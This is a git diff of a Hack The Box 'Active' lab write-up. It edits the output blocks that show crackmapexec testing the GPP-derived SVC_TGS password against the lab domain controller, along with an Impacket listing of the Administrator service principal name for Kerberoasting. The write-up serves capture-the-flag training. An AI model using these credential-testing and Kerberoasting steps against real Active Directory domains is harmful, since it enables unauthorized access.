@@ -323,10 +323,7 @@ Let's test this credential using `crackmapexec`.
 ┌──(kali㉿kali)-[~/htb]
 └─$ crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
 SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
-SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
-                                                                           
-┌──(kali㉿kali)-[~/htb]
-└─$ crackmapexec winrm 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
+SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
 ```
 
 Let's check which SMB shares are readable with `SVC_TGS`'s account.
@@ -481,7 +478,6 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
 --------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
 active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-12-04 12:55:29.126570             
-
 
 
 [-] CCache file is not found. Skipping...
